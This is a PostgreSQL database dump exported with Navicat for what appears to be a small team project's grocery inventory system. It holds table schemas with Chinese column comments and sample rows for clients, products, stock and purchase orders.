/*
 Navicat Premium Data Transfer

 Source Server         : www.victorysoft.online
 Source Server Type    : PostgreSQL
 Source Server Version : 100015
 Source Host           : www.victorysoft.online:5432
 Source Catalog        : team5
 Source Schema         : public

 Target Server Type    : PostgreSQL
 Target Server Version : 100015
 File Encoding         : 65001

 Date: 24/06/2022 20:11:12
*/


-- ----------------------------
-- Table structure for client_manage
-- ----------------------------
DROP TABLE IF EXISTS "public"."client_manage";
CREATE TABLE "public"."client_manage" (
  "client_id" varchar(255) COLLATE "pg_catalog"."default" NOT NULL,
  "client_name" varchar(255) COLLATE "pg_catalog"."default" NOT NULL,
  "client_phone" varchar(255) COLLATE "pg_catalog"."default" NOT NULL,
  "client_address" varchar(255) COLLATE "pg_catalog"."default" NOT NULL
)
;
COMMENT ON COLUMN "public"."client_manage"."client_id" IS '客户id';
COMMENT ON COLUMN "public"."client_manage"."client_name" IS '客户姓名';
COMMENT ON COLUMN "public"."client_manage"."client_phone" IS '客户电话';
COMMENT ON COLUMN "public"."client_manage"."client_address" IS '客户地址';

-- ----------------------------
-- Records of client_manage
-- ----------------------------
INSERT INTO "public"."client_manage" VALUES ('984570feeb1847f6929e0543a0552bd5', '李四', '13246599999', '上海');
INSERT INTO "public"."client_manage" VALUES ('cf6d83374b0f4f0d9bd6b37b822f2565', '王五', '13145451122', '武汉');
INSERT INTO "public"."client_manage" VALUES ('bac5ea0a4e574e658ea17a384dc70a23', '刘七', '13111224545', '天津');
INSERT INTO "public"."client_manage" VALUES ('64c38980b70b44769b1ad0db2416a811', '王十', '13241728369', '天津');
INSERT INTO "public"."client_manage" VALUES ('fdffa00b30a3416d8428304289509b9a', '路一', '13254658798', '台湾');
INSERT INTO "public"."client_manage" VALUES ('a0919db5c201476ba245b49ea05a9e56', '白二', '13285462137', '内蒙古');
INSERT INTO "public"."client_manage" VALUES ('85045f5df20d430b9a6bfa2a61aa6d2c', '孙九', '13925367845', '吉林');
INSERT INTO "public"."client_manage" VALUES ('8c987cb9f4214944b0a2923323610002', '孔八', '13911445252', '山东');
INSERT INTO "public"."client_manage" VALUES ('8f39ec4b38aa482697235473a2521832', '赵六', '13122339778', '江苏');
INSERT INTO "public"."client_manage" VALUES ('7283b284cb8e4011be9d199babb0592d', '张四', '13398987777', '上海');

-- ----------------------------
-- Table structure for menu
-- ----------------------------
DROP TABLE IF EXISTS "public"."menu";
CREATE TABLE "public"."menu" (
  "id" varchar(255) COLLATE "pg_catalog"."default" NOT NULL,
  "path" varchar(255) COLLATE "pg_catalog"."default",
  "description" varchar(255) COLLATE "pg_catalog"."default",
  "pid" varchar(32) COLLATE "pg_catalog"."default",
  "name" varchar(255) COLLATE "pg_catalog"."default"
)
;
COMMENT ON COLUMN "public"."menu"."id" IS '菜单ID';
COMMENT ON COLUMN "public"."menu"."path" IS '映射地址';
COMMENT ON COLUMN "public"."menu"."description" IS '描述';
COMMENT ON COLUMN "public"."menu"."pid" IS '父级子菜单';
COMMENT ON COLUMN "public"."menu"."name" IS '菜单名称';

-- ----------------------------
-- Records of menu
-- ----------------------------
INSERT INTO "public"."menu" VALUES ('bae4042d6da94ec58c90c015755be969', '/home', NULL, NULL, '主页');

-- ----------------------------
-- Table structure for order_message
-- ----------------------------
DROP TABLE IF EXISTS "public"."order_message";
CREATE TABLE "public"."order_message" (
  "order_id" varchar(255) COLLATE "pg_catalog"."default" NOT NULL,
  "user_id" varchar(255) COLLATE "pg_catalog"."default",
  "total_price" numeric(10,2),
  "creation_time" date,
  "payment_time" date,
  "order_status" bool
)
;
COMMENT ON COLUMN "public"."order_message"."order_id" IS '订单id';
COMMENT ON COLUMN "public"."order_message"."user_id" IS '用户id';
COMMENT ON COLUMN "public"."order_message"."total_price" IS '订单总价格';
COMMENT ON COLUMN "public"."order_message"."creation_time" IS '订单创建时间';
COMMENT ON COLUMN "public"."order_message"."payment_time" IS '订单支付时间';
COMMENT ON COLUMN "public"."order_message"."order_status" IS '订单支付状态';

-- ----------------------------
-- Records of order_message
-- ----------------------------

-- ----------------------------
-- Table structure for product_manage
-- ----------------------------
DROP TABLE IF EXISTS "public"."product_manage";
CREATE TABLE "public"."product_manage" (
  "product_id" varchar(36) COLLATE "pg_catalog"."default" NOT NULL,
  "product_name" varchar(32) COLLATE "pg_catalog"."default" NOT NULL,
  "product_describe" varchar(50) COLLATE "pg_catalog"."default",
  "product_price_purchase" float8,
  "product_price_shipment" float8,
  "product_price_suggest" float8,
  "product_format" varchar(50) COLLATE "pg_catalog"."default",
  "state" int4 DEFAULT 1,
  "create_datetime" timestamp(6) DEFAULT CURRENT_TIMESTAMP,
  "update_datetime" timestamp(6) DEFAULT CURRENT_TIMESTAMP,
  "person_id" varchar(36) COLLATE "pg_catalog"."default",
  "sort_id" char(36) COLLATE "pg_catalog"."default"
)
;
COMMENT ON COLUMN "public"."product_manage"."product_id" IS '产品编号';
COMMENT ON COLUMN "public"."product_manage"."product_name" IS '分类表的分类id（获取商品名称）';
COMMENT ON COLUMN "public"."product_manage"."product_describe" IS '产品描述';
COMMENT ON COLUMN "public"."product_manage"."product_price_purchase" IS '产品进价';
COMMENT ON COLUMN "public"."product_manage"."product_price_shipment" IS '出货单价';
COMMENT ON COLUMN "public"."product_manage"."product_price_suggest" IS '建议零售价';
COMMENT ON COLUMN "public"."product_manage"."product_format" IS '产品规格';
COMMENT ON COLUMN "public"."product_manage"."state" IS '产品状态（1正常销售，0暂停销售）';
COMMENT ON COLUMN "public"."product_manage"."create_datetime" IS '产品上架日期';
COMMENT ON COLUMN "public"."product_manage"."update_datetime" IS '产品更新日期';
COMMENT ON COLUMN "public"."product_manage"."person_id" IS '处理人的uid';

-- ----------------------------
-- Records of product_manage
-- ----------------------------
INSERT INTO "public"."product_manage" VALUES ('86f16408f9c744eaa47f4645075b34ca', '雪碧', '雪碧', 1.5, 3, 3, '550g', 1, '2022-06-05 16:23:39.212816', '2022-06-05 16:23:39.212816', '1', '1                                   ');
INSERT INTO "public"."product_manage" VALUES ('1041819b4f164cfeb6e6c82c14991b60', '桃李面包', '口感极佳，不含防腐剂', 3.5, 5.5, 5, '350g', 1, '2022-06-05 16:22:29.941401', '2022-06-05 16:22:29.941401', '1', '2                                   ');
INSERT INTO "public"."product_manage" VALUES ('1041819b4f164cfeb6e6c82c14091b60', '桃李毛毛虫', '口感极佳，不含防腐剂', 2.5, 5.5, 5, '350g', 1, '2022-06-05 16:22:29.941401', '2022-06-05 16:22:29.941401', '1', '2                                   ');
INSERT INTO "public"."product_manage" VALUES ('1041819b4f164cfeb6e6c82caaa91b60', '红烧牛肉面', '非油炸', 4, 5.5, 5, '400g', 1, '2022-06-24 04:17:48.028459', '2022-06-24 04:17:48.028459', '1', '6                                   ');
INSERT INTO "public"."product_manage" VALUES ('3331819b4f164cfeb6e6c82caaa91b60', '黄桃罐头', '纯天然食品', 6.5, 7, 7, '550g', 1, '2022-06-24 04:18:46.815204', '2022-06-24 04:18:46.815204', '1', '3                                   ');
INSERT INTO "public"."product_manage" VALUES ('4431819b4f164cfeb6e6c82caaa91b60', '草莓罐头', '纯天然食品', 6.5, 7, 7, '550g', 1, '2022-06-24 04:18:46.815204', '2022-06-24 04:18:46.815204', '1', '3                                   ');
INSERT INTO "public"."product_manage" VALUES ('9331819b4f164cfeb6e6c82caaa91b60', '喜之郎', '不添加色素', 5.5, 6, 6, '350g', 1, '2022-06-24 04:18:46.815204', '2022-06-24 04:18:46.815204', '1', '4                                   ');
INSERT INTO "public"."product_manage" VALUES ('cdde3ae582e24c409d7cec1b916bd0aa', '百事可乐', '百事可乐', 1.5, 3, 3, '350g', 0, '2022-06-05 16:22:57.445958', '2022-06-24 16:14:03.144', '1', '1                                   ');
INSERT INTO "public"."product_manage" VALUES ('3339353ccd2d4bdfbaabfb7573c588f0', '鲜果橙', '康师傅橙汁，酸甜可口', 2, 3, 3, '550ml/瓶', 1, '2022-06-24 16:09:38.70394', '2022-06-24 16:09:38.70394', '1', '1                                   ');

-- ----------------------------
-- Table structure for product_order
-- ----------------------------
DROP TABLE IF EXISTS "public"."product_order";
CREATE TABLE "public"."product_order" (
  "id" varchar(255) COLLATE "pg_catalog"."default" NOT NULL,
  "order_id" varchar(255) COLLATE "pg_catalog"."default" NOT NULL,
  "product_id" varchar(255) COLLATE "pg_catalog"."default",
  "product_count" varchar(255) COLLATE "pg_catalog"."default"
)
;
COMMENT ON COLUMN "public"."product_order"."order_id" IS '与order_message相连';

-- ----------------------------
-- Records of product_order
-- ----------------------------

-- ----------------------------
-- Table structure for product_sort
-- ----------------------------
DROP TABLE IF EXISTS "public"."product_sort";
CREATE TABLE "public"."product_sort" (
  "sort_id" char(36) COLLATE "pg_catalog"."default" NOT NULL,
  "sort_name" varchar(20) COLLATE "pg_catalog"."default"
)
;

-- ----------------------------
-- Records of product_sort
-- ----------------------------
INSERT INTO "public"."product_sort" VALUES ('1                                   ', '饮品');
INSERT INTO "public"."product_sort" VALUES ('2                                   ', '面包');
INSERT INTO "public"."product_sort" VALUES ('3                                   ', '罐头');
INSERT INTO "public"."product_sort" VALUES ('4                                   ', '果冻');
INSERT INTO "public"."product_sort" VALUES ('5                                   ', '豆干');
INSERT INTO "public"."product_sort" VALUES ('6                                   ', '方便面');

-- ----------------------------
-- Table structure for product_store
-- ----------------------------
DROP TABLE IF EXISTS "public"."product_store";
CREATE TABLE "public"."product_store" (
  "product_id" char(36) COLLATE "pg_catalog"."default" NOT NULL,
  "store_id" char(36) COLLATE "pg_catalog"."default" NOT NULL,
  "total" int4,
  "update_datetime" timestamp(6) DEFAULT CURRENT_TIMESTAMP,
  "state" int4,
  "create_datetime" timestamp(6) DEFAULT CURRENT_TIMESTAMP,
  "sort_id" char(32) COLLATE "pg_catalog"."default",
  "product_name" varchar(30) COLLATE "pg_catalog"."default"
)
;
COMMENT ON COLUMN "public"."product_store"."product_id" IS '商品编号';
COMMENT ON COLUMN "public"."product_store"."store_id" IS '库存表id';
COMMENT ON COLUMN "public"."product_store"."total" IS '数量';
COMMENT ON COLUMN "public"."product_store"."update_datetime" IS '更新时间';
COMMENT ON COLUMN "public"."product_store"."state" IS '库存状态（1充足，0不足，-1没有库存）';
COMMENT ON COLUMN "public"."product_store"."create_datetime" IS '创建时间';
COMMENT ON COLUMN "public"."product_store"."sort_id" IS '分类id
';

-- ----------------------------
-- Records of product_store
-- ----------------------------
INSERT INTO "public"."product_store" VALUES ('cdde3ae582e24c409d7cec1b916bd0aa    ', 'asdgg                               ', 13, '2022-06-24 13:17:41.62', 1, '2022-06-13 06:35:05.267016', '1                               ', '百事可乐');
INSERT INTO "public"."product_store" VALUES ('86f16408f9c744eaa47f4645075b34ca    ', 'wqer                                ', 28, '2022-06-24 19:09:40.861', 1, '2022-06-13 06:36:02.755764', '1                               ', '雪碧');
INSERT INTO "public"."product_store" VALUES ('3331819b4f164cfeb6e6c82caaa91b60    ', 'qwetrty                             ', 3, '2022-06-17 13:20:34.976', 1, '2022-06-30 13:58:52', '3                               ', '黄桃罐头');
INSERT INTO "public"."product_store" VALUES ('1041819b4f164cfeb6e6c82caaa91b60    ', 'asdfas                              ', 2, '2022-06-24 10:36:28.478', 1, '2022-06-30 13:58:52', '6                               ', '红烧牛肉面');
INSERT INTO "public"."product_store" VALUES ('9331819b4f164cfeb6e6c82caaa91b60    ', 'ghgsfd                              ', 2, '2022-06-24 04:27:51.394691', 1, '2022-06-13 06:36:02.755764', '4                               ', '喜之郎');
INSERT INTO "public"."product_store" VALUES ('1041819b4f164cfeb6e6c82c14091b60    ', 'wqerwqg                             ', 10, '2022-06-22 13:58:48', 1, '2022-06-30 13:58:52', '2                               ', '桃李毛毛虫');
INSERT INTO "public"."product_store" VALUES ('1041819b4f164cfeb6e6c82c14991b60    ', 'sadf                                ', 1, '2022-06-22 13:58:48', 1, '2022-06-30 13:58:52', '2                               ', '桃李面包');
INSERT INTO "public"."product_store" VALUES ('4431819b4f164cfeb6e6c82caaa91b60    ', 'asdgh                               ', 1, '2022-06-17 13:11:36.115', 1, '2022-06-13 06:35:05.267016', '3                               ', '草莓罐头');

-- ----------------------------
-- Table structure for purchase
-- ----------------------------
DROP TABLE IF EXISTS "public"."purchase";
CREATE TABLE "public"."purchase" (
  "purchase_id" char(36) COLLATE "pg_catalog"."default" NOT NULL,
  "create_datetime" timestamp(6) DEFAULT CURRENT_TIMESTAMP,
  "purchase_charge_person_id" varchar(36) COLLATE "pg_catalog"."default",
  "purchase_state" int4 DEFAULT 1,
  "msg" varchar(255) COLLATE "pg_catalog"."default",
  "total_price" float8
)
;
COMMENT ON COLUMN "public"."purchase"."purchase_id" IS '进货单号（或批次）';
COMMENT ON COLUMN "public"."purchase"."create_datetime" IS '进货的日期时间';
COMMENT ON COLUMN "public"."purchase"."purchase_charge_person_id" IS '负责人的uid';
COMMENT ON COLUMN "public"."purchase"."purchase_state" IS '进货状态（1成功处理，0滞留中，-1异常处理）';
COMMENT ON COLUMN "public"."purchase"."msg" IS '备注信息';

-- ----------------------------
-- Records of purchase
-- ----------------------------
INSERT INTO "public"."purchase" VALUES ('ae6da92b-0603-441d-9d38-d371e1316929', '2022-06-23 20:26:32.166906', '111', 1, 'chhh的测试', 4.4);
INSERT INTO "public"."purchase" VALUES ('b603feaf-f66c-47b0-a8ee-f5a55f72fa64', '2022-06-15 08:56:11.128946', '7835c13be3644e2e813187a2332e6095', 1, 'chhh的测试', 41.4);
INSERT INTO "public"."purchase" VALUES ('f5a55f72fa64                        ', '2022-06-21 12:38:52.374118', '1b142a6a9a53400eb7a939a94d6b8e23', 1, 'test', 5.5);
INSERT INTO "public"."purchase" VALUES ('0d6e09cf-9726-498a-97f8-0e209ae5a683', '2022-06-22 09:28:46.430381', '33457fd79d274eb48dac131550e2ed4a', 1, 'chhh的测试1', 10.5);
INSERT INTO "public"."purchase" VALUES ('e569ba97-df10-47fc-a0e9-182aa2ad87f2', '2022-06-24 12:28:13.050899', '111', 1, 'chhh的测试', 4.4);
INSERT INTO "public"."purchase" VALUES ('396ca963-a0bb-4df0-9c69-727ab1305d6e', '2022-06-24 12:28:35.95935', '111', 1, 'chhh的测试', 4.4);
INSERT INTO "public"."purchase" VALUES ('b3604ba5-e64e-4471-a62f-bae695e44314', '2022-06-24 12:29:35.346209', '3049622c52b4449ab9827d41c23d48c6', 1, 'chhh的测试', 4.4);
INSERT INTO "public"."purchase" VALUES ('90e161e4-a6f0-4fdd-8d5f-3aeb4e29f65d', '2022-06-24 12:31:34.253682', '111', 1, 'chhh的测试', 4.4);
INSERT INTO "public"."purchase" VALUES ('856712e3-06a0-4e31-9253-7165affc75ec', '2022-06-24 12:36:12.784282', '111', 1, 'chhh的测试', 4.4);
INSERT INTO "public"."purchase" VALUES ('dfe51169-b15e-458f-8e15-94fe711bc887', '2022-06-24 12:38:56.517729', '111', 1, 'chhh的测试', 8);
INSERT INTO "public"."purchase" VALUES ('b581fe64-1d14-4f15-bc32-97acb81c25ab', '2022-06-24 12:40:23.592595', '1', 1, 'admin-1测试', 8);
INSERT INTO "public"."purchase" VALUES ('5edd938d-a3e5-4933-a904-4858ce7a2cc7', '2022-06-24 12:55:43.637375', '1', 1, '', 9.5);
INSERT INTO "public"."purchase" VALUES ('e0c2a77c-3990-42c5-8350-9b4e00a80601', '2022-06-24 13:15:30.494305', '1', 1, '', 22.5);
INSERT INTO "public"."purchase" VALUES ('6752d74c-b192-495c-8ca1-866279a4b1ed', '2022-06-24 19:08:49.974958', '1', 1, 'Vectory', 12);

-- ----------------------------
-- Table structure for purchase_sort
-- ----------------------------
DROP TABLE IF EXISTS "public"."purchase_sort";
CREATE TABLE "public"."purchase_sort" (
  "id" varchar(36) COLLATE "pg_catalog"."default" NOT NULL,
  "sort_id" char(36) COLLATE "pg_catalog"."default" NOT NULL,
  "purchase_count" int4,
  "purchase_state" int4,
  "manage_datetime" timestamp(6) DEFAULT CURRENT_TIMESTAMP,
  "msg" varchar(255) COLLATE "pg_catalog"."default",
  "product_id" char(32) COLLATE "pg_catalog"."default",
  "purchase_name" varchar(20) COLLATE "pg_catalog"."default",
  "total_price" float8
)
;
COMMENT ON COLUMN "public"."purchase_sort"."id" IS '进货分表的编号';
COMMENT ON COLUMN "public"."purchase_sort"."sort_id" IS '货物的种类';
COMMENT ON COLUMN "public"."purchase_sort"."purchase_count" IS '该类货物的总数';
COMMENT ON COLUMN "public"."purchase_sort"."purchase_state" IS '货物状态（1成功处理，0滞留中，-1异常处理）';
COMMENT ON COLUMN "public"."purchase_sort"."manage_datetime" IS '货物处理的日期时间';
COMMENT ON COLUMN "public"."purchase_sort"."msg" IS '备注信息';
COMMENT ON COLUMN "public"."purchase_sort"."product_id" IS '产品表id
';
COMMENT ON COLUMN "public"."purchase_sort"."total_price" IS '花销';

-- ----------------------------
-- Records of purchase_sort
-- ----------------------------
INSERT INTO "public"."purchase_sort" VALUES ('qwerqwrt', '1                                   ', 64, 1, NULL, NULL, 'cdde3ae582e24c409d7cec1b916bd0aa', '可乐', 1.10000002384186);
INSERT INTO "public"."purchase_sort" VALUES ('asdftry', '1                                   ', 37, 1, NULL, NULL, '86f16408f9c744eaa47f4645075b34ca', '雪碧', 1.10000002384186);
INSERT INTO "public"."purchase_sort" VALUES ('2060cea1-9480-403a-b12e-fe510f8479f6', '1                                   ', 95, NULL, '2022-06-23 17:47:08.132355', 'chhh的测试', NULL, NULL, 1.10000002384186);
INSERT INTO "public"."purchase_sort" VALUES ('ab31e5ac-cf2b-402e-9a03-0b720c6261af', '1                                   ', 95, 1, '2022-06-15 08:47:46.069419', 'chhh的测试', '86f16408f9c744eaa47f4645075b34ca', '雪碧', 1.10000002384186);
INSERT INTO "public"."purchase_sort" VALUES ('asdfwqer', '1                                   ', 52, 1, NULL, NULL, '86f16408f9c744eaa47f4645075b34ca', '雪碧', 1.10000002384186);
INSERT INTO "public"."purchase_sort" VALUES ('063b6852-9929-4102-bd32-ffa78cd781fb', '1                                   ', 95, 1, '2022-06-22 09:22:48.598765', 'chhh的测试1', 'cdde3ae582e24c409d7cec1b916bd0aa', '可乐', 1.10000002384186);
INSERT INTO "public"."purchase_sort" VALUES ('e1dbf6a1-af25-48a4-84b1-19289bcf5f74', '2                                   ', 1, NULL, '2022-06-24 00:19:05.432448', '', NULL, NULL, 3.5);
INSERT INTO "public"."purchase_sort" VALUES ('06e6367c-509a-4dc6-bf68-88265075c3cf', '1                                   ', 4, NULL, '2022-06-24 00:19:05.440352', '', NULL, NULL, 6);
INSERT INTO "public"."purchase_sort" VALUES ('02ae4829-6cf0-41d3-ae76-62c6c2c0f62c', '1                                   ', 95, NULL, '2022-06-24 00:20:49.907917', 'chhh的测试', NULL, NULL, 7);
INSERT INTO "public"."purchase_sort" VALUES ('8597e30c-0cf5-482d-bcf1-bcb5cb95ea9b', '2                                   ', 4, NULL, '2022-06-24 12:00:03.710419', '', NULL, NULL, 14);
INSERT INTO "public"."purchase_sort" VALUES ('ab4efce3-49c4-4cb3-9d77-ed75230e3600', '2                                   ', 4, NULL, '2022-06-24 12:00:03.711267', '', NULL, NULL, 10);
INSERT INTO "public"."purchase_sort" VALUES ('0b691711-5470-48af-aae2-a494fac8ceed', '1                                   ', 95, NULL, '2022-06-24 12:14:39.820432', 'chhh的测试', 'cdde3ae582e24c409d7cec1b916bd0aa', '红烧牛肉面', 0);
INSERT INTO "public"."purchase_sort" VALUES ('95098697-0664-4358-bb4c-dd5eb66a6afc', '2                                   ', 4, NULL, '2022-06-24 12:17:25.883364', '', NULL, '桃李毛毛虫', 10);
INSERT INTO "public"."purchase_sort" VALUES ('6945cfcc-8a4d-493f-8d01-7c415f7ccb5f', '2                                   ', 4, NULL, '2022-06-24 12:17:25.885076', '', NULL, '桃李面包', 14);
INSERT INTO "public"."purchase_sort" VALUES ('9c24cd3c-b321-4799-b3cd-6af1dcc01107', '2                                   ', 4, NULL, '2022-06-24 12:20:11.948072', '', NULL, '桃李毛毛虫', 10);
INSERT INTO "public"."purchase_sort" VALUES ('568bfc12-94ff-4b3d-9278-e6a5941f4ecf', '2                                   ', 4, NULL, '2022-06-24 12:20:11.948539', '', NULL, '桃李面包', 14);
INSERT INTO "public"."purchase_sort" VALUES ('b6f1972a-7774-43a5-a0d9-bdb04af64839', '1                                   ', 2, NULL, '2022-06-24 12:24:45.154541', '', NULL, '可乐', 3);
INSERT INTO "public"."purchase_sort" VALUES ('40d72750-2e28-42d7-b5ba-66712bb8ff32', '1                                   ', 1, NULL, '2022-06-24 12:32:04.047046', '', 'cdde3ae582e24c409d7cec1b916bd0aa', '可乐', 1.5);
INSERT INTO "public"."purchase_sort" VALUES ('81f88e9d-6e2c-4c2c-807f-02307805f348', '3                                   ', 1, NULL, '2022-06-24 12:31:59.033462', '', '3331819b4f164cfeb6e6c82caaa91b60', '黄桃罐头', 6.5);
INSERT INTO "public"."purchase_sort" VALUES ('cb2611e3-57af-499f-8347-41772e11327f', '3                                   ', 1, NULL, '2022-06-24 12:24:45.208406', '', '3331819b4f164cfeb6e6c82caaa91b60', '黄桃罐头', 6.5);
INSERT INTO "public"."purchase_sort" VALUES ('52d84ddf-6c26-4418-bd5f-f4b5c2b5d474', '1                                   ', 95, NULL, '2022-06-24 12:39:30.115934', 'chhh的测试', 'cdde3ae582e24c409d7cec1b916bd0aa', '红烧牛肉面', 0);
INSERT INTO "public"."purchase_sort" VALUES ('fffa2500-d606-49fa-820c-06e81cfd0af4', '6                                   ', 1, NULL, '2022-06-24 12:55:42.645492', '', '1041819b4f164cfeb6e6c82caaa91b60', '红烧牛肉面', 4);
INSERT INTO "public"."purchase_sort" VALUES ('a0caf5ba-8cab-42c9-b9c4-e41d6d2498f7', '4                                   ', 1, NULL, '2022-06-24 12:55:42.646562', '', '9331819b4f164cfeb6e6c82caaa91b60', '喜之郎', 5.5);
INSERT INTO "public"."purchase_sort" VALUES ('ca400d2b-9af2-4e94-97f1-020cca8f7466', '2                                   ', 9, NULL, '2022-06-24 13:15:29.756672', '再来9个', '1041819b4f164cfeb6e6c82c14091b60', '桃李毛毛虫', 22.5);
INSERT INTO "public"."purchase_sort" VALUES ('9a7a9ed6-8549-4b20-b7be-027790c7ac93', '1                                   ', 7, NULL, '2022-06-24 19:08:38.846081', '', '86f16408f9c744eaa47f4645075b34ca', '雪碧', 10.5);
INSERT INTO "public"."purchase_sort" VALUES ('ab2bc3ee-8009-4698-bda2-9e6da14ce8ab', '1                                   ', 1, NULL, '2022-06-24 19:08:38.846929', '', 'cdde3ae582e24c409d7cec1b916bd0aa', '百事可乐', 1.5);

-- ----------------------------
-- Table structure for purchase_swap
-- ----------------------------
DROP TABLE IF EXISTS "public"."purchase_swap";
CREATE TABLE "public"."purchase_swap" (
  "purchase_id" char(36) COLLATE "pg_catalog"."default",
  "id" char(36) COLLATE "pg_catalog"."default"
)
;

-- ----------------------------
-- Records of purchase_swap
-- ----------------------------
INSERT INTO "public"."purchase_swap" VALUES ('b603feaf-f66c-47b0-a8ee-f5a55f72fa64', 'asdfwqer                            ');
INSERT INTO "public"."purchase_swap" VALUES ('b603feaf-f66c-47b0-a8ee-f5a55f72fa64', 'asdftry                             ');
INSERT INTO "public"."purchase_swap" VALUES ('b603feaf-f66c-47b0-a8ee-f5a55f72fa64', 'qwerqwrt                            ');
INSERT INTO "public"."purchase_swap" VALUES ('b603feaf-f66c-47b0-a8ee-f5a55f72fa64', 'ab31e5ac-cf2b-402e-9a03-0b720c6261af');
INSERT INTO "public"."purchase_swap" VALUES ('0d6e09cf-9726-498a-97f8-0e209ae5a683', 'asdfwqer                            ');
INSERT INTO "public"."purchase_swap" VALUES ('0d6e09cf-9726-498a-97f8-0e209ae5a683', 'asdftry                             ');
INSERT INTO "public"."purchase_swap" VALUES ('0d6e09cf-9726-498a-97f8-0e209ae5a683', 'qwerqwrt                            ');
INSERT INTO "public"."purchase_swap" VALUES ('6d23ac3d-ddc1-4f99-8bed-2ad6bb1e60eb', 'asdfwqer                            ');
INSERT INTO "public"."purchase_swap" VALUES ('6d23ac3d-ddc1-4f99-8bed-2ad6bb1e60eb', 'asdftry                             ');
INSERT INTO "public"."purchase_swap" VALUES ('6d23ac3d-ddc1-4f99-8bed-2ad6bb1e60eb', 'qwerqwrt                            ');
INSERT INTO "public"."purchase_swap" VALUES ('6d23ac3d-ddc1-4f99-8bed-2ad6bb1e60eb', 'ab31e5ac-cf2b-402e-9a03-0b720c6261af');
INSERT INTO "public"."purchase_swap" VALUES ('10520ee8-0641-48b5-b195-67cff6f8f233', 'asdfwqer                            ');
INSERT INTO "public"."purchase_swap" VALUES ('10520ee8-0641-48b5-b195-67cff6f8f233', 'asdftry                             ');
INSERT INTO "public"."purchase_swap" VALUES ('10520ee8-0641-48b5-b195-67cff6f8f233', 'qwerqwrt                            ');
INSERT INTO "public"."purchase_swap" VALUES ('10520ee8-0641-48b5-b195-67cff6f8f233', 'ab31e5ac-cf2b-402e-9a03-0b720c6261af');
INSERT INTO "public"."purchase_swap" VALUES ('ae6da92b-0603-441d-9d38-d371e1316929', 'asdfwqer                            ');
INSERT INTO "public"."purchase_swap" VALUES ('ae6da92b-0603-441d-9d38-d371e1316929', 'asdftry                             ');
INSERT INTO "public"."purchase_swap" VALUES ('ae6da92b-0603-441d-9d38-d371e1316929', 'qwerqwrt                            ');
INSERT INTO "public"."purchase_swap" VALUES ('ae6da92b-0603-441d-9d38-d371e1316929', 'ab31e5ac-cf2b-402e-9a03-0b720c6261af');
INSERT INTO "public"."purchase_swap" VALUES ('687e1cff-e182-4474-9129-fadd76973164', 'asdfwqer                            ');
INSERT INTO "public"."purchase_swap" VALUES ('687e1cff-e182-4474-9129-fadd76973164', 'asdftry                             ');
INSERT INTO "public"."purchase_swap" VALUES ('687e1cff-e182-4474-9129-fadd76973164', 'qwerqwrt                            ');
INSERT INTO "public"."purchase_swap" VALUES ('687e1cff-e182-4474-9129-fadd76973164', 'ab31e5ac-cf2b-402e-9a03-0b720c6261af');
INSERT INTO "public"."purchase_swap" VALUES ('e569ba97-df10-47fc-a0e9-182aa2ad87f2', 'asdfwqer                            ');
INSERT INTO "public"."purchase_swap" VALUES ('e569ba97-df10-47fc-a0e9-182aa2ad87f2', 'asdftry                             ');
INSERT INTO "public"."purchase_swap" VALUES ('e569ba97-df10-47fc-a0e9-182aa2ad87f2', 'qwerqwrt                            ');
INSERT INTO "public"."purchase_swap" VALUES ('e569ba97-df10-47fc-a0e9-182aa2ad87f2', 'ab31e5ac-cf2b-402e-9a03-0b720c6261af');
INSERT INTO "public"."purchase_swap" VALUES ('396ca963-a0bb-4df0-9c69-727ab1305d6e', 'asdfwqer                            ');
INSERT INTO "public"."purchase_swap" VALUES ('396ca963-a0bb-4df0-9c69-727ab1305d6e', 'asdftry                             ');
INSERT INTO "public"."purchase_swap" VALUES ('396ca963-a0bb-4df0-9c69-727ab1305d6e', 'qwerqwrt                            ');
INSERT INTO "public"."purchase_swap" VALUES ('396ca963-a0bb-4df0-9c69-727ab1305d6e', 'ab31e5ac-cf2b-402e-9a03-0b720c6261af');
INSERT INTO "public"."purchase_swap" VALUES ('b3604ba5-e64e-4471-a62f-bae695e44314', 'asdfwqer                            ');
INSERT INTO "public"."purchase_swap" VALUES ('b3604ba5-e64e-4471-a62f-bae695e44314', 'asdftry                             ');
INSERT INTO "public"."purchase_swap" VALUES ('b3604ba5-e64e-4471-a62f-bae695e44314', 'qwerqwrt                            ');
INSERT INTO "public"."purchase_swap" VALUES ('b3604ba5-e64e-4471-a62f-bae695e44314', 'ab31e5ac-cf2b-402e-9a03-0b720c6261af');
INSERT INTO "public"."purchase_swap" VALUES ('90e161e4-a6f0-4fdd-8d5f-3aeb4e29f65d', 'asdfwqer                            ');
INSERT INTO "public"."purchase_swap" VALUES ('90e161e4-a6f0-4fdd-8d5f-3aeb4e29f65d', 'asdftry                             ');
INSERT INTO "public"."purchase_swap" VALUES ('90e161e4-a6f0-4fdd-8d5f-3aeb4e29f65d', 'qwerqwrt                            ');
INSERT INTO "public"."purchase_swap" VALUES ('90e161e4-a6f0-4fdd-8d5f-3aeb4e29f65d', 'ab31e5ac-cf2b-402e-9a03-0b720c6261af');
INSERT INTO "public"."purchase_swap" VALUES ('856712e3-06a0-4e31-9253-7165affc75ec', 'asdfwqer                            ');
INSERT INTO "public"."purchase_swap" VALUES ('856712e3-06a0-4e31-9253-7165affc75ec', 'asdftry                             ');
INSERT INTO "public"."purchase_swap" VALUES ('856712e3-06a0-4e31-9253-7165affc75ec', 'qwerqwrt                            ');
INSERT INTO "public"."purchase_swap" VALUES ('856712e3-06a0-4e31-9253-7165affc75ec', 'ab31e5ac-cf2b-402e-9a03-0b720c6261af');
INSERT INTO "public"."purchase_swap" VALUES ('dfe51169-b15e-458f-8e15-94fe711bc887', '81f88e9d-6e2c-4c2c-807f-02307805f348');
INSERT INTO "public"."purchase_swap" VALUES ('dfe51169-b15e-458f-8e15-94fe711bc887', '40d72750-2e28-42d7-b5ba-66712bb8ff32');
INSERT INTO "public"."purchase_swap" VALUES ('b581fe64-1d14-4f15-bc32-97acb81c25ab', '81f88e9d-6e2c-4c2c-807f-02307805f348');
INSERT INTO "public"."purchase_swap" VALUES ('b581fe64-1d14-4f15-bc32-97acb81c25ab', '40d72750-2e28-42d7-b5ba-66712bb8ff32');
INSERT INTO "public"."purchase_swap" VALUES ('5edd938d-a3e5-4933-a904-4858ce7a2cc7', 'fffa2500-d606-49fa-820c-06e81cfd0af4');
INSERT INTO "public"."purchase_swap" VALUES ('5edd938d-a3e5-4933-a904-4858ce7a2cc7', 'a0caf5ba-8cab-42c9-b9c4-e41d6d2498f7');
